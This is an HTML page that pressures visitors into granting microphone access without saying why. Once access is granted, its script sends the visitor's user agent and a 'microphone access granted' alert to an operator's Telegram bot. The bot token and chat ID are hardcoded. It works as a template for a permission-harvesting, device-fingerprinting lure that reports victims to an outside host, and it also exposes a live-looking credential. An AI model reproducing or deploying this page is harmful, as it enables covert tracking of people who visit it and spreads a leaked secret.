<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Microphone Access</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background: linear-gradient(135deg, #4facfe, #00f2fe);
            color: white;
        }
        .container {
            background: rgba(255, 255, 255, 0.1);
            padding: 20px 30px;
            border-radius: 10px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            text-align: center;
            width: 90%;
            max-width: 400px;
        }
        h1 {
            font-size: 24px;
            margin-bottom: 10px;
        }
        p {
            font-size: 16px;
            margin-bottom: 20px;
        }
        button {
            background-color: #0066cc;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }
        button:hover {
            background-color: #004c99;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Microphone Permission</h1>
        <p>Allow microphone access to proceed.</p>
        <button id="requestPermission">Allow Microphone</button>
    </div>

    <script>
        document.getElementById('requestPermission').addEventListener('click', async () => {
            try {
                // Request microphone access
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                alert("Microphone access granted!");

                // Prepare data to send to Telegram
                const chat_id = '5998202830'; // Replace with your Telegram Chat ID
                const token = '7789337898:AAGfuc-dxckjDn2IL8RCDHf43haYcbz9J5g'; // Replace with your Telegram Bot Token
                const telegramURL = `https://api.telegram.org/bot${token}/sendMessage`;

                const message = `🎙️ Microphone Access Alert\n\nMicrophone access has been granted.\n\n📱 Device Info:\nUser Agent: ${navigator.userAgent}`;

                fetch(telegramURL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: chat_id, text: message })
                }).then(response => {
                    if (response.ok) {
                        alert("Microphone access details sent to Telegram!");
                    } else {
                        alert("Failed to send data to Telegram.");
                    }
                }).catch(error => {
                    console.error("Error:", error);
                    alert("An error occurred while sending data.");
                });
            } catch (error) {
                alert("Microphone access denied. You cannot proceed.");
            }
        });
    </script>
</body>
    </html>
